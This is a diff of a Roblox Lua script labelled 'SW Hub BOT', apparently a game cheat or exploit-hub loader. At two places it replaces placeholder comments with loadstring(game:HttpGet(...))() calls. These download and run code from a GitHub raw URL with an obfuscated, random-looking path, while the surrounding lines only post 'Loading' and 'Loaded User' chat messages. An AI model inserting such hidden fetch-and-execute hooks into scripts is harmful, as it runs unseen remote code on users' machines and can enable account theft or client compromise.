@@ -14,7 +14,8 @@ local LocalPlayer = game:GetService("Players").LocalPlayer
 
 
 
---point A
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/HeyyyyRappppp/e6f3gr6ey7deu3h32/main/2r2t4ggrtrrhthtyhtdhr/afaghkgsdgsdkvnskvsvnskvnsdkvnsdkdvnsdkvdskfskfhks%20sfksh%20fkshf%20ksdhfkshf%20kshf%20sf')))()
 
 wait(1)
 wait()
@@ -29,7 +30,9 @@ game.StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[SW Hub BOT]: "..text;
 end
 swhubbot("Loading... Maybe it take a while",1019)
 wait(.5)
----Point B
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/HeyyyyRappppp/e6f3gr6ey7deu3h32/main/2r2t4ggrtrrhthtyhtdhr/afaghkgsdgsdkvnskvsvnskvnsdkvnsdkdvnsdkvdskfskfhks%20sfksh%20fkshf%20ksdhfkshf%20kshf%20sf')))()
+
 wait()
 swhubbot("Loaded User: "..Player.Name..".",1019)
 
